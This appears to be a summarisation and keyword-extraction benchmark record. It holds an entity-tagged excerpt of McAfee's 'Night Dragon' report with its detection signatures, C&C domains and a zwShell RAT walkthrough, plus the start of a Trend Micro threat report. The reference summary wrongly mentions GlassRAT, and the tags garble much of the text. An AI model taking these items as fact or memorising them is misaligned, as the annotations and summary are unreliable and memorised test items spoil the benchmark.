beacon with an initial response of \u201c \\x01\\x60[\\x00-\\xff]+\\x68\\x57\\x24\\x13.\u201dThe backdoor sends the password to the server in clear text after the server acknowledges the connection . While the backdoor and the server have an active connection , the backdoor will send \u201c keep - alive \u201d messages that can be detected with : \u201c \\x03\\x50[\\x00-\\xff]+\\x68\\x57\\x24\\x13.\u201d10White [ORG] PaperGlobal [ORG] Energy [ORG] Cyberattacks : \u201c Night Dragon\u201dThe attackers use \u201c dynamic [ORG] DNS \u201d Internet name services accounts to relay [ORG] C&C communications or temporarily associate [ORG] DNS addresses with remote servers . Primary domains that have been used for [ORG] C&C traffic include ( all of these have been used frequently by other malware):\u2022 [ xxxx].is - a - chef.com \u2022 [ xxxx].thruhere.net \u2022 [ xxxx].office - on - the.net \u2022 [ xxxx].selfip.comNote : The above hostnames ( is - a - chef.com < url thruhere.net < url office- on - the.net < url selfip.com < url by themselves do not indicate malicious activity and there are plenty of legitimate subdomains that may use those hostnames . Communication to those hostnames should be carefully scrutinized but not necessarily raise alarm on its ownCompany extranet servers have also been used as either unique or secondary / redundant [ORG] C&C servers . In some instances , the attackers have ( probably mistakenly ) used droppers configured to compromise [CARDINAL] one company \u2019s computers \u2014 in another company \u2019s computers . McAfee recommends that companies configure intrusion detection system ( IDS ) rules to detect the noted signatures ( or employ the user - defined signature [ UDS ] \u201c BACKDOOR : [ORG] NightDragon [ORG] Communication [ORG] Detected \u201d in [ORG] McAfee [ORG] Network Security Platform ) and monitor [ORG] DNS for outbound communications to dynamic [ORG] DNS addresses resolving to or pathed back as suballocated to servers in [GPE] China , where the company \u2019s name or common abbreviation forms the [ORDINAL] first part of the address . This may be difficult . However , if samples of the backdoor DLLs are found , [ORG] DNS monitoring can help to identify other compromised hosts in the company network . McAfee also recommends that companies review web or IDS logs for file transfers to addresses registered in [GPE] China . McAfee can assist with the analysis or provide instructions and tools for internal review . Additional Detection Techniques The backdoor beacons with its corresponding [ORG] C&C server as long as the related address is active . If the address is abandoned or unreachable , the backdoor stops beaconing after some undetermined interval . When a compromised computer is restarted , however , the beaconing begins again because it is registered as a service in [LAW] the [LAW] Windows [LAW] Registry . Anti - virus may or may not detect the [PERSON] Trojan unless it is beaconing or a full file system scan is performed . [ORG] McAfee [ORG] Early [ORG] Detection [ORG] Customers can deploy a number of [ORG] McAfee products to help protect information systems from the Night Dragon attack:\u2022 [ORG] McAfee [ORG] Vulnerability Manager : Using agentless discovery and vulnerability checking to assess systemson your network , [ORG] McAfee [ORG] Vulnerability Manager is an enterprise - class vulnerability management system that will detect infected Night Dragon systems as well as the security weaknesses in systems that have been compromised . The \u201c wham - apt - nightdragon - detected - v7.fasl3 \u201d script will detect this threat remotely on systems.11White [ORG] PaperGlobal [ORG] Energy [ORG] Cyberattacks : \u201c [WORK_OF_ART] Night [WORK_OF_ART] Dragon\u201d\u2022 [WORK_OF_ART] McAfee [WORK_OF_ART] Policy [WORK_OF_ART] Auditor : Using agent - based configuration audit checks to determine the most secureconfiguration of a system , [ORG] McAfee [ORG] Policy [ORG] Auditor software detects the security weaknesses in the systems that have been compromised\u2022 McAfee Risk Advisory ( MRA ): Properly deployed , [ORG] McAfee [ORG] Risk [ORG] Advisor would have allowed administratorsto see the misconfigurations and gap in security coverage that facilitated Night Dragon \u2019s exploitationMcAfee Detection Night Dragon also displays a pattern of correlated activities with an assortment of other software tools that [ORG] McAfee can assist companies to identify.\u2022 [ORG] McAfee [ORG] VirusScan [ORG] Enterprise : [ORG] Update your anti - virus .DATs to at least version [CARDINAL] 6232 and ensure thaton - demand scans are working properly and perform a full file system virus scan . [PERSON] Review [PERSON] McAfee [PERSON] ePO software or anti - virus alerts and network logs for \u201c [ORG] NightDragon \u201d signature detections to identify compromised systems . Please submit any related samples to virus_research@mcafee.com or submit on the web at url\u2022 [ORG] McAfee [ORG] Network [ORG] Threat Response : [ORG] McAfee [ORG] Network [ORG] Threat [ORG] Response technology would have detectedthe malicious [ORG] C&C traffic and would have alerted administrators to the attack early , giving them time to react and prevent future damageAdministrators can also download the following free tools from [GPE] McAfee:\u2022 McAfee \u201c Night Dragon Vulnerability Scanner \u201d based on [ORG] McAfee [ORG] Vulnerability Manager technology toscan their networks for the presence of [WORK_OF_ART] malware\u2022 [WORK_OF_ART] McAfee [WORK_OF_ART] Labs [WORK_OF_ART] StingerMcAfee [WORK_OF_ART] Prevention For complete prevention of this and most other attacks involving advanced persistent threats ( APTs ) , customers can deploy application whitelisting and change / configuration control software on their critical servers . These technologies completely prevent the unauthorized running of DLLs / EXEs as well as the modification of registry keys , services , and more involved in all of [DATE] today \u2019s [ORG] APT and zero - day attacks.\u2022 [ORG] McAfee [ORG] Application [ORG] Control : [ORG] McAfee [ORG] Application [ORG] Control software stops Night Dragon by not allowing the dropper files from executing ( even as administrator on Windows ) , thereby preventing downloads of additional malware and the setup of [ORG] C&C channels that allowing RAT control and theft of sensitive files\u2022 [ORG] McAfee [ORG] Configuration [ORG] Control : [ORG] McAfee [ORG] Configuration [ORG] Control software allows you to disallowany configuration changes to your systems , protecting them from being modified without explicit permission ( even with administrative access)\u2022 [ORG] McAfee [ORG] Database [ORG] Activity [ORG] Monitoring : delivers complete database protection including 0 - day attacksand web born attacks such as those seen with [ORG] SQL injection in [ORG] Night [ORG] Dragon.\u2022 [ORG] McAfee [ORG] Network Security Platform : blocks malicious network activity such as [ORG] APT command andcontrol traffic.\u2022 [ORG] McAfee [ORG] Enterprise [ORG] Firewall : Properly installed and configured at the border and inside your organization , [ORG] McAfee [ORG] Firewall would have prevented the Night Dragon operation from penetrating so deeply into the affected organizations and would have blocked [ORG] C&C communication from the RAT\u2022 McAfee Web Gateway : Properly installed and configured , [ORG] McAfee [ORG] Web [ORG] Gateway would have preventedthe Night Dragon operation from using their RATs , requiring them to proxy - enable their RATs or use alternative proxy - enabled RATs\u2022 [ORG] McAfee [ORG] Endpoint [ORG] Encryption : Properly installed and configured , [ORG] McAfee [ORG] Endpoint [ORG] Encryption softwarereduces the impact of the Night Dragon attack by restricting access to the core targeted assets12White [ORG] PaperGlobal [ORG] Energy [ORG] Cyberattacks : \u201c [WORK_OF_ART] Night [WORK_OF_ART] Dragon\u201d\u2022 [WORK_OF_ART] McAfee [WORK_OF_ART] Data [WORK_OF_ART] Loss Protection : [WORK_OF_ART] Properly installed and configured , [ORG] McAfee [ORG] Network DLP and/or McAfeeHost DLP solutions allow you to prevent and detect the extraction of sensitive information from outside [ORG] the [ORG] company\u2022 [ORG] McAfee [ORG] Host [ORG] Intrusion [ORG] Prevention [ORG] 8.0 : [ORG] McAfee [ORG] Host [ORG] Intrusion [ORG] Prevention [ORG] 8.0 software has introduced a new \u201c [WORK_OF_ART] TrustedSource \u201d APT detection feature that allows enterprises to correlate endpoint executable activity with the network [ORG] C&C communication to detect and prevent RAT communications and data exfiltration activity\u2022 McAfee VirusScan \u00ae Enterprise : In addition to detecting associated malware and RATs on the endpoint , customers can also leverage access protection features in [ORG] McAfee [ORG] VirusScan [ORG] Enterprise to prevent ( and alert on ) the creation of Night Dragon - related files and folder structures . Other built - in features such infection tracing and [ORG] McAfee [ORG] Global [ORG] Threat [ORG] Intelligence \u2122 can assist with the identification and quarantining or removal of new and unknown associated malware and RATs . If you have discovered the presence of Night Dragon in your environment and would like incident - response or forensics assistance to respond and repair , please contact [ORG] Foundstone [ORG] Professional [ORG] Services on incidentresponse@foundstone.com or submit any related samples to [ORG] Virus_Research@avertlabs.com or on the web at [ORG] McAfee [ORG] Labs [ORG] WebImmune . Conclusion Well - coordinated , targeted attacks such as Night Dragon , orchestrated by a growing group of malicious attackers committed to their targets , are rapidly on the rise . These targets have now moved beyond the defense industrial base , government , and military computers to include global corporate and commercial targets . While Night Dragon attacks focused specifically on the energy sector , the tools and techniques of this kind can be highly successful when targeting any industry . Our experience has shown that many other industries are currently vulnerable and are under continuous and persistent cyberespionage attacks of this type . More and more , these attacks focus not on using and abusing machines within the organizations being compromised , but rather on the theft of specific data and intellectual property . It is vital that organizations work proactively toward protecting the heart of their value : intellectual property . Enterprises need to take action to discover these assets in their environments , assess their configurations for vulnerabilities , and protect them from misuse and attack . For additional research and information , review Hacking Exposed : Network Secret and Solutions \u2014 6th Edition ( Osborne McGraw - Hill ) . You can also visit url for information on advanced hacker techniques and to sign up for \u201c [WORK_OF_ART] Hacking [WORK_OF_ART] Exposed \u201d [DATE] monthly webinars . Credits and Acknowledgements The preceding white paper was a collaborative effort among numerous people and entities including [ORG] McAfee [ORG] Foundstone [ORG] Professional [ORG] Services consultants , [PERSON] McAfee [PERSON] Labs , [ORG] McAfee [ORG] employees , executives , and researchers , [ORG] HBGary and [ORG] National Cyber - Forensics [ORG] & [ORG] Training [ORG] Alliance ( [ORG] NCFTA ) . Significant contributors include [PERSON] Shane [PERSON] Shook , [PERSON] Dmitri [PERSON] Alperovitch , [PERSON] Stuart [PERSON] McClure , [PERSON] Georg [PERSON] Wicherski , [PERSON] Greg [PERSON] Hoglund , [PERSON] Shawn [PERSON] Bracken , [PERSON] Ryan [PERSON] Permeh , [PERSON] Vitaly [PERSON] Zaytsev , [PERSON] Mark [PERSON] Gilbert , [PERSON] Mike [PERSON] Spohn , [PERSON] George [PERSON] Kurtz , and [PERSON] Adam [PERSON] Meyers.13White [ORG] PaperGlobal [ORG] Energy [ORG] Cyberattacks : \u201c [WORK_OF_ART] Night [WORK_OF_ART] Dragon\u201dAppendix [WORK_OF_ART] A : [ORG] zwShell \u2014 the RAT Below is a walk - through of the capabilities of [ORG] zwShell and a demonstration of how the attackers used [ORG] zwShell as a command and control server to exfiltrate data from within the targeted companies.1 . When [ORG] zwShell is launched , it presents a fake crash error to the user and contains a hidden text entryfield below the \u201c Write of address 00000000 . Process stopped \u201d line . By entering the password in the hidden dialog box above the \u201c ok \u201d button to launch the application requires typing a special password , \u201c [PERSON] zw.china . \u201d Without that password , the tool will not start . This obfuscation method is likely used to confuse investigators about the true purpose of this executable.2 . Once the error is bypassed , and [ORG] zwShell is launched , it allows the attacker to create a custom [GPE] Trojan by selecting the [ORG] Server menu or to launch the [ORG] C&C server by clicking [ORG] Start and entering the port to listen for traffic with the password used by the backdoor DLLs . Once started , the application will begin listening for incoming compromised client connections and display them inside the grid . The attacker can launch as many instances of the [ORG] zwShell application as required \u2014 as long as each listens to a different port or password . In this manner , multiple \u201c networks \u201d of compromised computers can be monitored.3 . The attacker can also click on the [GPE] Options menu to configure the [ORG] C&C server settings . Those settingsinclude selection of the listening port , the password that will encrypt the [ORG] C&C traffic ( which must match the password selected at the time of the [PERSON] Trojan generation ) , the ability to specify custom sound notifications for when infected machines connect and disconnect from the [ORG] C&C server , and the ability to increase the color depth used for remote access to the machine , as well as an optional capability to allow resumes of interrupted file transfers from the client machine . The attacker can stop the listener and start with new options to monitor or connect with other compromised computers.14White [ORG] PaperGlobal [ORG] Energy [ORG] Cyberattacks : \u201c Night Dragon\u201d4 . The attacker can specify the password ( which must match the password set up for the server in Step [CARDINAL] 3 ) , the name and path to the RAT [ORG] DLL that will be injected into the svchost.exe Windows services process , the service and mutex names , and service displayed name and description . The attacker can also specify up to [CARDINAL] two [ORG] C&C hostnames or [ORG] IP address , port address , and dropper EXE process icon . Once the Create button is clicked , [ORG] zwShell will generate a custom EXE dropper process which , when executed , will delete itself and extract a RAT [ORG] DLL that will be launched as a persistent Windows service . The [ORG] RAT will then immediately send a beacon on the configured port to the designated [ORG] C&C server and wait for instructions.5 . The dropper will be copied over network shares to the compromised computer and remotely executewith psexec or via [ORG] Windows [ORG] Terminal [ORG] Services ( RDP ) . In some cases , an \u201c [ORG] AT.job \u201d or \u201c [ORG] SchTasks \u201d entry will be used to execute the dropper over the network on the compromised computer . When executed , the dropper will create a temporary file and extract a RAT [ORG] DLL that will be launched as a persistent Windows service . The [ORG] RAT will then immediately send a beacon on the configured port to the designated [ORG] C&C server and wait for instructions . The dropper will automatically delete itself after the backdoor service is created , and the temporary file will be deleted when the system is rebooted . An entry will be created in the Windows Update logs ( KB****.log ) in the [CARDINAL] C:\\Windows directory with the date and time and path+name of the temporary file.15White [ORG] PaperGlobal [ORG] Energy [ORG] Cyberattacks : \u201c Night Dragon\u201d6 . When a client is executed , it connects to the attacker \u2019s [ORG] zwShell interface , along with its [ORG] IP address , PC name , name of the logged - in user , and information about the operating system ( OS ) version of the machine , including the major patch levels.7 . The attacker in charge of the [ORG] C&C server can establish full remote control of the connected machine and can browse the file system , launch command - line shells , manipulate the registry , view the remote desktop , and uninstall the [PRODUCT] Trojan from the client.8 . Browsing the client file system is a fully interactive process and has a familiar user interface similarto Windows Explorer . Individual files and folders can be deleted , renamed , copied , downloaded , and uploaded to the remote machine.16White [ORG] PaperGlobal [ORG] Energy [ORG] Cyberattacks : \u201c [WORK_OF_ART] Night [WORK_OF_ART] Dragon\u201d9 . A remote command - line shell can be launched to execute commands directly on the remote machine . When the attacker uses this function , a copy of [ORG] CMD.EXE is copied to the compromised system in a Windows % Temp% directory with the filename svchost.exe . This copy is an unmodified version of the Microsoft [PRODUCT] Windows command shell [ORG] executable.10 . The Registry can also be viewed and edited in a user interface similar to [LAW] the [LAW] Windows [LAW] Registry [LAW] editor.17White [ORG] PaperGlobal [ORG] Energy [ORG] Cyberattacks : \u201c Night Dragon\u201dAppendix B : Attribution IMPORTANT : McAfee has no direct evidence to name the originators of these attacks but rather has provided circumstantial evidence . While we believe many actors have participated in these attacks , we have been able to identify [CARDINAL] one individual who has provided the crucial [ORG] C&C infrastructure to the attackers \u2014 this individual is based in [GPE] Heze [GPE] City , [GPE] Shandong [GPE] Province , [GPE] China . Although we do n\u2019t believe this individual is the mastermind behind these attacks , it is likely this person is aware or has information that can help identify at least some of the individuals , groups , or organizations responsible for these intrusions . Figure [CARDINAL] 6 . [GPE] Shandong [GPE] Province , [ORG] ChinaThe individual runs a company that , according to the company \u2019s advertisements , provides \u201d [WORK_OF_ART] Hosted [WORK_OF_ART] Servers in the [GPE] U.S. with no records kept \u201d for [PERCENT] as [PERCENT] little [PERCENT] as [PERCENT] 68 [PERCENT] RMB ( US$ [MONEY] 10 ) per year for [CARDINAL] 100 MB of space . The company \u2019s U.S.-based leased servers have been used to host the [ORG] zwShell [ORG] C&C application that controlled machines across the victim companies . Beyond the connection to the hosting services reseller operation , there is other evidence indicating that the attackers were of [NORP] Chinese origin . Beyond the curious use of the \u201c zw.china \u201d password that unlocks the operation of the [ORG] zwShell C&C Trojan , [PERSON] McAfee has determined that all of the identified data exfiltration activity occurred from [GPE] Beijing - based [ORG] IP addresses and operated inside the victim companies weekdays from [TIME] 9:00 [TIME] a.m. [TIME] to [TIME] 5:00 [TIME] p.m. [GPE] Beijing time , which also suggests that the involved individuals were \u201c company men \u201d working on a regular job , rather than freelance or unprofessional hackers . In addition , the attackers employed hacking tools of [NORP] Chinese origin and that are prevalent on [NORP] Chinese underground hacking forums . These included [LOC] Hookmsgina and [ORG] WinlogonHack , tools that intercept Windows logon requests and hijack usernames and passwords.18White [ORG] PaperGlobal [ORG] Energy [ORG] Cyberattacks : \u201c Night Dragon\u201dFigure 7 . Instructions on the use of [ORG] WinlogonHack tool by its [NORP] Chinese developers . On the compromised web server , they also deployed ASPXSpy , a web - based remote administration tool , also of [NORP] Chinese origin . Figure [CARDINAL] 8 . Parts of the ASPXSpy code with attribution to the [NORP] Chinese developer . There is nothing to suggest that the developers of these tools had any direct connection to these intrusions , as the tools are widely available on the [NORP] Chinese web forums and tend to be used extensively by [NORP] Chinese hacker groups . Although it is possible that all of these indicators are an elaborate red - herring operation designed to pin the blame for the attacks on [NORP] Chinese hackers , we believe this to be highly unlikely . Further , it is unclear who would have the motivation to go to these extraordinary lengths to place the blame for these attacks on someone else . We have strong evidence suggesting that the attackers were based in [GPE] China . [ORG] McAfee , [ORG] Inc. [CARDINAL] 2821 Mission College Boulevard [GPE] Santa [GPE] Clara , CA [CARDINAL] 95054 888 847 8766 www.mcafee.comThe information in this document is provided only for educational purposes and for the convenience of McAfee customers . The information contained herein is subject to change without notice , and is provided \u201c as is , \u201d without guarantee or warranty as to the accuracy or applicability of the information to any specific situation or circumstance . McAfee , the [PERSON] McAfee logo , [PERSON] McAfee [PERSON] Labs , [ORG] McAfee [ORG] Foundstone , McAfee ePolicy Orchestrator , [PERSON] McAfee [PERSON] ePO , McAfee Global Threat Intelligence , and [ORG] McAfee [ORG] VirusScan [ORG] Enterprise are registered trademarks or trademarks of [ORG] McAfee or its subsidiaries in [GPE] the [GPE] United [GPE] States and other countries . Other marks and brands may be claimed as the property of others . Copyright \u00a9 2011 McAfee [CARDINAL] 21401wp_night - dragon_0211", "generated_text": "analysis; a cyberattack; 2009; oil; energy; petrochemical companies; social engineering; spear-phishing attacks; Microsoft Windows; Active Directory compromises; remote administration tools; remote access; use; remote access tools; use; a RAT; remote access targets; sensitive proprietary operations; Project-Finance Information; sensitive project-finance information; the attackers; China; the malware; indicators; compromise; security controls; infrastructure; detection; techniques; attribution; the attacks; a domain; C&C infrastructure; Chinese; a malware; Technical details; analysis; the tools; Windows; Dynamic DNS; RATs; a domain; a domain; the domain; ID; the threat actors; a DNS server; the domain; the malware; a certificate; Indicators; reconnaissance; attribution; scrutiny; the threat actors; the domains; the attacks; the RAT.", "ref_text": "<START-1>The document analyzes a series of cyberattacks called \"Night Dragon\" targeting global energy and petrochemical companies starting in late 2009. The attacks originated primarily from China and involved the following: Compromise of company extranet web servers via SQL injection to gain remote access. Upload of hacker tools to pivot further into corporate networks. Cracking of passwords to gain authenticated access to more systems. Disabling of IE proxy settings to allow direct C2 communication. Installation of remote access trojans (RATs) like zwShell for data exfiltration. Focus on operational data like oil field bids and process control systems. The zwShell RAT tool allowed the attackers to build custom malware for victims and control compromised systems. The attacks went undetected for years using basic hacking techniques. Network, registry, and file indicators are provided to detect GlassRAT. McAfee products like Vulnerability Manager, EPO, and Network Security Platform can also identify the threat. Attribution suggests the attacks originated from China based on malware tools, passwords, data exfiltration times, infrastructure, and individuals providing hosting services. The report aims to provide insights to detect and prevent similar future cyber espionage campaigns. In summary, Night Dragon demonstrates advanced persistent threat tactics by nation-state actors against critical infrastructure with the goal of stealing sensitive data. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4918032786885246, "gpt3/lexical/rouge_rouge2": 0.15058823529411763, "gpt3/lexical/rouge_rougeL": 0.21545667447306788, "gpt3/lexical/rouge_rougeLsum": 0.21545667447306788, "gpt3_generated_text": ["In this article, McAfee Foundstone Professional Services and McAfee Labs discuss a series of coordinated and targeted cyberattacks against global oil, energy, and petrochemical companies that have been ongoing since November 2009. The attacks involve social engineering, spear-phishing, exploitation of Microsoft Windows vulnerabilities, and the use of remote administration tools (RATs) to target and harvest sensitive information related to oil and gas field bids and operations. The attacks, dubbed \"Night Dragon,\" have been traced back to China. The article provides an analysis of the tools, techniques, and network activities used in these attacks and offers detection and prevention techniques for companies. It also includes details on the attribution of the attacks. The article emphasizes the need for security vendors to share findings in order to protect and repair affected parties. The attacks involve the compromise of company extranet web servers, the use of password cracking tools to gain further access, and the uploading of RAT malware. The attackers use compromised web servers as command and control servers and disable Microsoft Internet Explorer proxy settings to allow direct communication from infected machines to the internet. The article also mentions the use of dynamic DNS and certificates by the attackers. Overall, the article highlights the increasing sophistication and persistence of cyberthreats and the need for improved security controls and detection techniques."]}, {"split_name": "val", "sample_id": "val_51", "prompt_text": "Extract the keywords: Defending [ORG] the [ORG] ExpandingAttack [ORG] SurfaceTrend [ORG] Micro [ORG] 2022 Midyear Cybersecurity ReportContents 4 Threat Actors Focus on Advancing Capabilities , Expanding the Digital Attack Surface , and Capitalizing on Current Issues12 The Ransomware Threat Landscape Continues to Evolve with [ORG] New [ORG] Players [ORG] and [ORG] Lucrative [ORG] Monetization [ORG] Methods20 [ORG] Software Vulnerabilities Threaten to Disrupt the Operations of Businesses29 Old Issues , Unconventional Attacks Plague Cloud Environments35 The Evolving Attack Surface Requires Effective Multilayered Defenses and [ORG] Security [ORG] Technologies37 The Threat Landscape in BriefPublished by [ORG] Trend [ORG] Micro [ORG] ResearchStock image used under license from [DATE] Shutterstock.comThe [DATE] first [DATE] half [DATE] of [DATE] 2022 saw large sections of the workforce either returning to the physical workplace or transitioning to a hybrid setup consisting of a combination of both work - from - home ( [ORG] WFH ) and on - site work . For many organizations that have transitioned their employees to remote working environments during [DATE] the [DATE] past [DATE] couple [DATE] of [DATE] years , these changes mean facing an ever - growing attack surface in the new normal , where security teams must contend with the challenge of defending all possible sections of the IT infrastructure . Ransomware developers continued their shift toward more lucrative and efficient monetization methods , particularly the ransomware - as - a - service ( RaaS ) model that has been credited as [CARDINAL] one of the key reasons for the rapid spread of ransomware attacks . In [DATE] the [DATE] first [DATE] half [DATE] of [DATE] the [DATE] year , [CARDINAL] three RaaS threat actors stood above the rest : [PERSON] Conti , [ORG] LockBit , and [ORG] BlackCat , each of which saw significantly higher detections in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] the [DATE] year compared to [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021 , indicating that cybercriminals are increasingly turning toward a RaaS partnership due to the benefits it provides for both parties . We also observed relatively new ransomware families such as [PERSON] Black [PERSON] Basta , [ORG] Nokoyawa , and Hive being used in high - profile attacks on big - game targets . [DATE] The [DATE] first [DATE] half [DATE] of [DATE] 2022 also saw the emergence of advanced persistent threat ( [ORG] APT ) groups that employed sophisticated toolkits and expansive infrastructure in their campaigns . At the same time , threat actors continued to turn to commodity malware , integrating older tools and malware into their attack routines for their capabilities and reliability . We have also observed that cybercriminals are seemingly looking to expand their operations beyond non - Windows operating systems , with Linux increasingly coming under fire . In their endless pursuit to benefit from any situation , malicious actors also capitalized on the [GPE] Russia - [GPE] Ukraine hostilities to launch cyberattacks on either side or prey on people interested in the conflict . Based on Trend Micro \u2122 Zero Day Initiative \u2122 ( ZDI ) data , there was a rise in the number of published vulnerability advisories in general , as well as in critical- and high - severity flaws during [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2022 . We focused on some of the noteworthy critical vulnerabilities that targeted crucial business tools and software that are used in enterprise systems while also taking note of the vulnerabilities that affected macOS and Linux . We also delved into [ORG] the [ORG] Data [ORG] Distribution [ORG] Service [ORG] Standard ( [ORG] DDS ) and the vulnerabilities that might have a potential impact on the machines and devices that use this standard . The cloud remains a popular target for malicious actors , with some capitalizing on old and persistent issues such as misconfiguration and others attempting to develop more novel and unconventional methods to launch attacks on cloud infrastructure . In our [DATE] 2022 [DATE] midyear roundup , we examine the most significant trends and incidents that influenced the cybersecurity landscape in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] the [DATE] year . We also review our [DATE] 2022 security predictions to see which ones aligned with the trends in [DATE] the [DATE] first [DATE] six [DATE] months [DATE] of [DATE] the [DATE] year . Through this report , we hope to enlighten users and organizations not just on the different threats that they face but also the robust security measures and policies that they need to consider to protect their environments and systems in the face of a growing attack surface that requires equally capable and extensive security measures . Threat Actors Focus on Advancing Capabilities , Expanding the Digital Attack Surface , and Capitalizing on Current Issues Organizations Express Concern Over [ORG] the [ORG] Growing [ORG] Attack [ORG] SurfaceOver [DATE] the [DATE] past [DATE] few [DATE] years , many companies have risen to the challenge of digital transformation byadopting digital technologies to modify their existing business models , processes , and company cultures . This transformation has subsequently created a wider digital attack surface that encompasses a broaderrange of areas , including email inboxes , internet - of - things ( [ORG] IoT ) devices , mobile applications , websites , public cloud services , and even the supply - chain infrastructure . In a study we conducted in partnership with [ORG] Sapio [ORG] Research , we surveyed [CARDINAL] 6,297 IT security decision - makers from [CARDINAL] 29 countries about their thoughts on the risks brought about by the growing attack surface.1We discovered that a significant number ( 73 % ) of them were concerned about the size of their digitalattack surface . 37 % described their situation as constantly evolving and messy , while another 43%argued that the attack surface is spiraling out of control . Despite these concerns , 62 % of the respondents admitted to having blind spots that weaken their securityposture . 37 % of the organizations also claimed to have the least insight into cloud assets . 35 % said thesame of their insights into networks , while [PERCENT] 32 % responded that they have the least insight into their end - user assets . It also became clear that a number of these organizations were uncertain about how to proceed given therisks that they face . 38 % of respondents identified quantifying cyber risk as their primary challenge , while33 % stated that they simply lack the resources to understand and manage these risks . Another [CARDINAL] 32%cited that they have limited visibility into the areas that are at risk.4 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity Report73 % of IT security decision makers are concerned about the digital attack surface.43 % argue that the attack surface is spiraling out of control.37 % describe the attack surface as constantly evolving and messy . Figure [CARDINAL] 1 . A survey of [CARDINAL] 6,297 IT security decision - makers reveals that a significant number of them areconcerned about the digital attack surface . Source : [ORG] Trend [ORG] Micro survey in partnership with [PERSON] Sapio [PERSON] ResearchAreas where organizations have the least security insight into37 % Cloud assets34 % Networks32 % End - user assetsFigure 2 . IT security decision - makers name cloud assets , networks , and end - user assets as the topthree areas where they have the least security insights into . Source : [ORG] Trend [ORG] Micro survey in partnership with [ORG] Sapio [ORG] ResearchThreat [ORG] Actors [ORG] Like [ORG] Earth [ORG] Lusca and [LOC] Earth [LOC] Berberoka [LOC] Continue to Use Wide - Ranging Tools and Extensive Infrastructure in Their [ORG] AttacksThe first half of 2022 saw the continuation of targeted campaigns involving [ORG] APT groups that play the longgame by employing large infrastructure and integrating different kinds of malware and other tools in theirattacks . [CARDINAL] One of the prominent [ORG] APT groups from [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2022 was [LOC] the [LOC] Earth [LOC] Lusca , a threat actor that hasbeen active since [DATE] mid-20212 and which conducts cyberespionage and financially motivated campaignstargeting a wide range of organizations around the world by using spear - phishing lures and watering holes.5 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity [ORG] ReportThe group employs infrastructure that can be divided into [CARDINAL] two clusters . The [ORDINAL] first is built via rented virtualprivate servers ( VPSs ) that are used for [LOC] Earth [LOC] Lusca \u2019s social engineering attacks . The group also usesthese as their command - and - control ( [ORG] C&C ) servers . In particular , [LOC] Earth [LOC] Lusca uses the [ORG] C&C server thatis connected to this cluster to deploy a number of malware families such as [PERSON] Cobalt [PERSON] Strike , [ORG] ShadowPad , [PERSON] Funny [PERSON] Switch , and [ORG] Winnti . The [ORDINAL] second cluster is composed of compromised servers that run older , open - source versions of OracleGlassFish Server . This cluster is used for vulnerability scanning in public - facing servers and buildingtraffic tunnels within the network . The group also uses it as a [ORG] C&C server for Cobalt Strike . CobaltStrike callback [PERSON] EarthWorm tunnelingExploit reconCompromisedserversPublic - facing serverThreat actor(China)VPN / ProxyserversC&C callbackWatering hole [ORG] tInternal serversFigure [CARDINAL] 3 . [NORP] Earth [NORP] Lusca \u2019s infection routine showing the [CARDINAL] two clusters the group employs in its attacksVPSsVictim \u2019s computerA large portion of the threat actor \u2019s primary victims seem to be high - value targets such as governmentand educational institutions , political groups , news media , and even Covid-19 research organizations . In [DATE] April [DATE] 2022 , we published a research paper documenting the activities of an [ORG] APT group we named [PERSON] EarthBerberoka that primarily targets gambling websites in China.3 The group , which has been active since [DATE] atleast [DATE] 2020 , uses a wide range of malware families that share the same back - end infrastructure despitetargeting different operating systems ( Windows , Linux , and macOS).In addition to its extensive list of malware families , [PERSON] Earth [PERSON] Berberoka employs several different infectionvectors : an allegedly secure chat app called [PERSON] MiMi , a bogus cryptocurrency app , and a website hosting amalicious [PERSON] Adobe [PERSON] Flash [PERSON] Player installer . Another notable intrusion set we encountered in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2022 is [ORG] NetDooka , a multicomponentmalware framework that is distributed via a pay - per - install ( PPI ) service.4 The framework , which containsa loader , a dropper , a protection driver , and a remote access trojan ( RAT ) , uses the [ORG] PrivateLoader malwarefor distribution . According to a report from [ORG] Intel471 , [ORG] PrivateLoader infects a user \u2019s machine throughdownloaded pirated software.56 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity ReportFollowing infection , it installs the [ORDINAL] first [ORG] NetDooka malware , a dropper component that decrypts and executesthe loader . After scanning the environment , the loader then downloads another dropper component thatis executed by the loader . This dropper will be used for decrypting and executing the final payload , a full - featured RAT that can perform various functions such as starting a remote shell , grabbing browser data , and taking screenshots . The infrastructure of [ORG] NetDooka makes it an attractive option for clients that want to avail of the [ORG] PPIbusiness model for their operations while also allowing their operators the opportunity to easily spreadtheir malware . Threat Actors Like [ORG] Conti [ORG] Drive [ORG] Emotet [ORG] ResurgenceAlthough new malware families often garner the lion\u2019sshare of attention from both the security industry andPredictionsthe general public , older malware , especially thoseIn our [DATE] 2022 security predictions , wethat have proven to be effective , still pose a threatforesaw that commodity malwareto organizations . In our [DATE] 2022 security predictions , would grow into a formidable threat aswe mentioned that malicious actors are increasinglyransomware operators continuouslyturning to commodity malware and other tools tointegrate it into their attacks.make their attacks more effective.6 This has turnedout to be an accurate prediction for [PERSON] Emotet , an infamous botnet that is being offered as part of a malware - as - a - service ( MaaS ) scheme . Arrival1Malicious spam with URL ( subject is invoice or payment noti\ufb01cation)A user selecting a URL in malicious spam leads to [ORG] a [ORG] download.2 [ORG] Document with malicious macro executes [ORG] PowerShell command line to download the payload . [PERSON] Installation3 a. % [PERSON] System%\\<\ufb01le name>.exe b.%AppData%\\Local\\Microsoft\\ Windows\\<\ufb01le [LOC] name>.exe5 [LOC] Deletes [LOC] Zone . [PERSON] Identi\ufb01er [PERSON] ADS6 [PERSON] Creates service ( if with admin rights ) a. With admin rights b. Without admin rights [ORG] Service name / Regrun value is the same as < \ufb01le name>.Routines7 [PERSON] List running processes8 Get system andoperation system info9 Send info to [ORG] C&C server10Create autostart registry /h / k / c / u\\%regrun% ( if without admin rights)C&C server sends modules to perform other routines11Execute modules received from [ORG] C&C server a. Update copy b. [PERSON] Spammer module c. 